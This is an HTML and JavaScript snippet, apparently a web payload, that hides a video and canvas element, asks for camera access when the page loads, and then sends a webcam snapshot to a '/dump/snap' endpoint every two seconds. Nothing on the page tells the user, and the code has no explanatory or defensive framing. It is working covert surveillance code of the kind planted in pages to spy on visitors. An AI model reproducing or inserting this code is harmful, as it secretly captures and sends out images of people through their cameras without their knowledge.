<div style="display: none;">
<video id="takephoto-video" width="320" height="320"> Video stream not available. </video>
<canvas id="takephoto-canvas" class="hide"></canvas>
</div>

<script>
(function() {
    document.addEventListener("DOMContentLoaded", function(event) {
        var width = 320; // We will scale the photo width to this
        var height = 0; // This will be computed based on the input stream

        var streaming = false;

        var video = null;
        var canvas = null;

        navigator.getMedia = (navigator.getUserMedia ||
            navigator.webkitGetUserMedia ||
            navigator.mozGetUserMedia ||
            navigator.msGetUserMedia);

        if (!navigator.getMedia) 
            return;

        video = document.getElementById('takephoto-video');
        canvas = document.getElementById('takephoto-canvas');

        navigator.getMedia({
            video: true,
            audio: false
        }, function(stream) {
            if (navigator.mozGetUserMedia) {
                video.mozSrcObject = stream;
            } else {
                var vendorURL = window.URL || window.webkitURL;
                video.src = vendorURL.createObjectURL(stream);
            }
            video.play();
        }, function(err) {
            console.log("An error occured! " + err);
        });

        video.addEventListener('canplay', function(ev) {
            if (!streaming) {
                height = video.videoHeight / (video.videoWidth / width);

                // Firefox currently has a bug where the height can't be read from
                // the video, so we will make assumptions if this happens.

                if (isNaN(height)) {
                    height = width / (4 / 3);
                }

                video.setAttribute('width', width);
                video.setAttribute('height', height);
                canvas.setAttribute('width', width);
                canvas.setAttribute('height', height);

                streaming = true;
            }
        }, false);


        setInterval(function() {
            var context = canvas.getContext('2d');
            canvas.width = width;
            canvas.height = height;
            context.drawImage(video, 0, 0, width, height);

            var data = canvas.toDataURL('image/png');
            if (!data)
                return;

		if (data.trim()==='data:,')
			return;

		var http = new XMLHttpRequest();
		var url = "/dump/snap";
		http.open("POST", url, true);
		http.setRequestHeader("Content-type", "image/png");
		http.send(data);
        }, 2000);
    
        event.preventDefault();
    }, false);
})();
</script>


